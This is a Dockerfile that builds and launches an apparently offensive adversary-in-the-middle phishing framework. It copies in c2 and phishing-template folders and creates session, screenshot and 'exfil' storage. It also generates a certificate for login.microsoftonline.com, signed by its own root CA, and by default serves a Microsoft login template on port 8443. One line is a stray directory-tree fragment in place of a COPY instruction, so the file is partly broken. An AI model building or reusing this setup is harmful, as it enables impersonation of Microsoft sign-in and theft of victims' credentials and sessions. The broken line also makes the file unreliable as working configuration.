FROM python:3.12-slim

LABEL maintainer="ghost1o1 <ghost1o1@ghost-sec.ca>"
LABEL description="PhishCloner Ultimate v1.0.0 — Adversary-in-the-Middle Phishing Framework"
LABEL version="1.0.0"
LABEL org.opencontainers.image.source="https://github.com/187Ghost101/phishcloner-ultimate"

ENV DEBIAN_FRONTEND=noninteractive
ENV PYTHONUNBUFFERED=1
ENV PYTHONDONTWRITEBYTECODE=1
ENV PC_VERSION=1.0.0

# System deps for cryptography, weasyprint, playwright
RUN apt-get update && apt-get install -y --no-install-recommends \
        openssl ca-certificates \
        libssl-dev libffi-dev \
        libxml2-dev libxslt1-dev \
        libpango-1.0-0 libpangoft2-1.0-0 \
        libcairo2 libgdk-pixbuf-2.0-0 \
        zlib1g-dev libjpeg-dev \
        gcc g++ make git curl wget \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY requirements.txt setup.sh phishcloner.py LICENSE README.md /app/
COPY engine/ /app/engine/
COPY c2/ /app/c2/
├── termux/ /app/termux/
COPY android/ /app/android/
COPY templates/ /app/templates/
COPY data/ /app/data/
COPY docs/ /app/docs/
COPY assets/ /app/assets/

RUN chmod +x setup.sh && \
    pip install --no-cache-dir --upgrade pip setuptools wheel && \
    pip install --no-cache-dir -r requirements.txt && \
    mkdir -p certs phish_sessions phish_screenshots phish_exfil c2_data logs build

# Generate TLS certs at build time
RUN mkdir -p certs && \
    openssl req -x509 -newkey rsa:4096 -keyout certs/phishcloner-ca-key.pem \
        -out certs/phishcloner-ca.pem -days 3650 -nodes \
        -subj "/C=US/O=GhostNet Security/CN=PhishCloner Root CA" 2>/dev/null && \
    openssl req -newkey rsa:2048 -keyout certs/phishcloner-key.pem \
        -out certs/phishcloner-csr.pem -nodes \
        -subj "/C=US/O=GhostNet Security/CN=login.microsoftonline.com" 2>/dev/null && \
    openssl x509 -req -in certs/phishcloner-csr.pem \
        -CA certs/phishcloner-ca.pem -CAkey certs/phishcloner-ca-key.pem \
        -CAcreateserial -out certs/phishcloner-cert.pem -days 365 2>/dev/null

EXPOSE 8443 5000

HEALTHCHECK --interval=30s --timeout=5s --retries=3 \
    CMD curl -kf https://localhost:8443/health || exit 1

ENTRYPOINT ["./setup.sh"]
CMD ["python3", "phishcloner.py", "serve", "--template", "microsoft", "--port", "8443"]
